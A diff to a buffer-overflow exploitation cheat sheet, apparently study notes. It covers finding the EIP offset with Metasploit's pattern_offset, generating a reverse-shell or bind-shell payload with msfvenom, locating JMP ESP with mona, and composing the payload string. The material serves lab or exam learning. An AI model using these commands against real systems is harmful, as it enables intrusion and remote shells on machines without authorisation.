@@ -52,7 +52,6 @@ RESULT: EIP OVERWRITE WITH "A" (41414141)
 RESULT: EIP VALUE
 
 {PATTERN_OFFSET}
-/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <length> -q [EIP VALUE]
   
 RESULT: OFFSET
@@ -81,14 +80,16 @@ RESULT: FILL SIZE
 
 ## 7- GENERATE SHELLCODE
 
-msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b "\x00\x0a\x0d\x20" –e x86/shikata_ga_nai
+msfvenom -p windows/shell/reverse_tcp LPORT=4444 LHOST=10.10.10.10 -b "\x00\x0a\x0d\x20" –e x86/shikata_ga_nai -f c
+
+RESULT: SHELLCODE
 
 ## 8- LOCATE JMP JUMP
 
 !mona modules (look for modules without protection)
 
+RESULT: JMP ESP
+
 ## 9- COMPOSE FINAL EXPLOIT
 
-JUNK + [A * 4368] + '\x97\x45\x13\x08' + '\x83\xc0\x0c\xff\xe0' + '\x90\'*20 + shellcode
-
-SHELLCODE + [CHARS TO EIP] + JMP ESP + [JUMP TO BUFFER START]
+payload = "\x41" * <length> + <ret_address> + "\x90" * 16 + <shellcode> + "\x43" * <remaining_length>
